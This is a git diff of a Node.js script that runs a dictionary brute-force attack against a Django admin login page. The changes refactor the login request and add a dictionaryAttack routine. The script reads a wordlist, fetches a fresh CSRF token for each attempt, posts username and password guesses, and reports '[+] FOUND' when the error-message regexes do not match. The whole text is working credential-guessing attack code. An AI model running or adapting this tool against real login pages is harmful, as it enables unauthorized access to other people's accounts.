@@ -16,22 +16,19 @@ if (process.argv.length !== 5) {
 }
 
 // Set user, filepath, url from CLI args
-var username = process.argv[2];
-var filepath = process.argv[3];
-var baseUrl  = process.argv[4];
+var USERNAME = process.argv[2];
+var FILEPATH = process.argv[3];
+var BASE_URL = process.argv[4];
 
 // Set regexp to define CSRF and login errors
 var CSRF    = /<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' \/>/;
 var ERROR_1 = /Please enter the correct username/ ;
 var ERROR_2 = /Please correct the error below/;
 
-// Read words from file synchronously
-var words = fs.readFileSync(filepath).toString().split('\n');
-
-// Configure the CSRF request
+// Configure the CSRF token request
 var csrfOptions = {
   port: 8000,
-  url: baseUrl,
+  url: BASE_URL,
   method: 'GET',
   headers: {}
 };
@@ -45,38 +42,39 @@ var getCSRF = function(callback) {
   });
 };
 
-// Main Loop
-async.each(words, function(word, callback) {
+// Configure the login request
+var loginOptions = function(user, password, csrfToken) {
+  return {
+    port: 8000,
+    url: BASE_URL + '/login/',
+    method: 'POST',
+    headers: { 
+      Referer: BASE_URL,
+      Cookie: 'csrftoken=' + csrfToken 
+    },
+    form: {
+      csrfmiddlewaretoken: csrfToken,
+      username: user,
+      password: password,
+      next: '/admin/'
+    }
+  };
+};
 
-  // Start by grabbing CSRF token
+var tryLogin = function(user, password, callback) {
+
   getCSRF(function(token) {
-    
-    // Configure the login request
-    var loginOptions = {
-      port: 8000,
-      url: baseUrl + '/login/',
-      method: 'POST',
-      headers: { 
-        Referer: baseUrl,
-        Cookie: 'csrftoken=' + token 
-      },
-      form: {
-        csrfmiddlewaretoken: token,
-        username: username,
-        password: word,
-        next: '/admin/'
-      }
-    };
+    var opt = loginOptions(user, password, token);
 
     // Send a login POST
-    request(loginOptions, function (error, response, body) {
+    request(opt, function (error, response, body) {
       if (!error) {
         // If we match known regex password is incorrect
         if ( response.statusCode === 200 && (body.match(ERROR_1) || body.match(ERROR_2))) {
-          console.log('[-] Invalid: ' + word);
+          console.log('[-] Invalid: ' + password);
         } else if (response.statusCode < 500) {
           console.log(
-            '[+] FOUND: ' + word  +
+            '[+] FOUND: ' + password  +
             '\n[+] Shutting down....' 
           );
 
@@ -89,4 +87,26 @@ async.each(words, function(word, callback) {
       callback();
     });
   });
+}
+
+// Function to try each word in an array
+var dictionaryAttack = function(words) {
+  async.each(words, function(word, done) {
+    tryLogin(USERNAME, word, done);
+  });
+};
+
+// =====================================================================
+//  MAIN ===============================================================
+// =====================================================================
+
+fs.readFile(FILEPATH, function(err, data) {
+  var words = data.toString().split('\n');
+  
+  console.log('[+] Starting bruteforce...');
+  dictionaryAttack(words);
 });
+
+
+
+
